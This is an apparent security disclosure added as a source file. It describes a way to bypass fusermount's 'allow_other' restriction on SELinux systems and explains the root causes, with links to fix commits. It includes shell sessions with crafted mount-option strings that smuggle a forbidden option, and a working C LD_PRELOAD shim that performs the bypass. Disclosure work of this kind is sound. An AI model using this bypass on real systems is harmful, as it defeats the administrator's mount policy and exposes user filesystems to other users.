@@ -1,0 +1,100 @@
+/*
+It is possible to bypass fusermount's restrictions on the use of the
+"allow_other" mount option as follows if SELinux is active.
+
+Here's a minimal demo, tested on a Debian system with SELinux enabled in
+permissive mode:
+
+===============================================
+uuser@debian:~$ mount|grep /mount
+user@debian:~$ grep user_allow_other /etc/fuse.conf 
+#user_allow_other
+user@debian:~$ _FUSE_COMMFD=10000 fusermount -o allow_other mount/
+fusermount: option allow_other only allowed if 'user_allow_other' is set in /etc/fuse.conf
+user@debian:~$ _FUSE_COMMFD=10000 fusermount -o 'context=system_u:object_r:fusefs_t:s0-s0:c0-\,allow_other' mount
+sending file descriptor: Bad file descriptor
+user@debian:~$ mount|grep /mount
+/dev/fuse on /home/user/mount type fuse (rw,nosuid,nodev,relatime,context=system_u:object_r:fusefs_t:s0-s0:c0,user_id=1000,group_id=1000,allow_other)
+===============================================
+
+Here's a demo that actually mounts a real FUSE filesystem with allow_other,
+again on a Debian system configured to use SELinux:
+===============================================
+user@debian:~$ cat fuse-shim.c
+*/
+
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <dlfcn.h>
+#include <stdlib.h>
+int execv(const char *path, char *const argv_[]) {
+  char **argv = (void*)argv_; /* cast away const */
+  for (char **argvp = argv; *argvp != NULL; argvp++) {
+    char *arg = *argvp;
+    for (char *p = arg; *p; p++) {
+      if (*p == '#') *p = '\\';
+    }
+  }
+  int (*execv_real)(const char *, char *const argv[]) = dlsym(RTLD_NEXT, "execv");
+  execv_real(path, argv_);
+}
+
+/*
+user@debian:~$ gcc -shared -o fuse-shim.so fuse-shim.c -ldl
+user@debian:~$ echo hello world > hello.txt
+user@debian:~$ zip hello.zip hello.txt
+  adding: hello.txt (stored 0%)
+user@debian:~$ LD_PRELOAD=./fuse-shim.so fuse-zip -o 'context=system_u:object_r:fusefs_t:s0-s0:c0-#,allow_other' hello.zip mount
+user@debian:~$ mount|grep /mount
+fuse-zip on /home/user/mount type fuse.fuse-zip (rw,nosuid,nodev,relatime,context=system_u:object_r:fusefs_t:s0-s0:c0,user_id=1000,group_id=1000,allow_other)
+user@debian:~$ sudo bash
+root@debian:/home/user# ls -laZ mount
+total 5
+drwxrwxr-x.  3 root root system_u:object_r:fusefs_t:s0-s0:c0    0 Jul 18 02:19 .
+drwxr-xr-x. 30 user user system_u:object_r:unlabeled_t:s0    4096 Jul 18 02:19 ..
+-rw-r--r--.  1 user user system_u:object_r:fusefs_t:s0-s0:c0   12 Jul 18 02:19 hello.txt
+root@debian:/home/user# cat mount/hello.txt
+hello world
+===============================================
+
+
+I have tested that this also works on Fedora (which, unlike Debian, has SELinux
+enabled by default.)
+
+
+Unfortunately, I only noticed that this was possible after I publicly sent some
+fusermount hardening patches (https://github.com/libfuse/libfuse/pull/268),
+when the maintainer asked a question about one of the patches.
+
+
+Breaking down the attack, the problems are:
+
+1. fusermount's do_mount() is written as if backslashes escape commas in mount
+   options; however, this is only true for the "fsname" and "subtype"
+   pseudo-options filtered out by do_mount(). Neither SELinux nor the FUSE
+   filesystem follow those semantics. This means that an attacker can smuggle
+   a forbidden option through fusermount's checks if the previous option ends
+   with a backslash. However, no option accepted by the FUSE filesystem can end
+   with a backslash, so this seemed unexploitable at first.
+   This is fixed by the following commit in my pull request:
+   https://github.com/libfuse/libfuse/pull/268/commits/455e73588357
+2. fusermount uses a blacklist, not a whitelist; this blacklist does not contain
+   the mount options understood by the SELinux and Smack LSMs. LSMs have the
+   opportunity to grab mount options and make them invisible to the actual
+   filesystem through the security_sb_copy_data() security hook.
+   For this attack, I'm using the "context" option.
+   This is fixed by the following commit in my pull request:
+   https://github.com/libfuse/libfuse/pull/268/commits/d23efabfcee4
+3. The SELinux LSM is slightly lax about parsing the level component of SELinux
+   context strings when the policy uses Multi-Level Security (MLS).
+   When using MLS, the format of a context string is
+   "<user>:<role>:<type>:<level>"; the level component is parsed by
+   mls_context_to_sid(). The level component is supposed to specify a
+   sensitivity range (one or two parts delimited with '-'); each part of the
+   range may be followed by ':' and a category set specification.
+   If the sensitivity range consists of two parts and the second part of the
+   range is followed by a category set, the function incorrectly marks a
+   trailing '-' and any following data until ':' or '\0' as consumed, but does
+   not actually parse this data. This allows an attacker to smuggle a backslash
+   through.
+*/
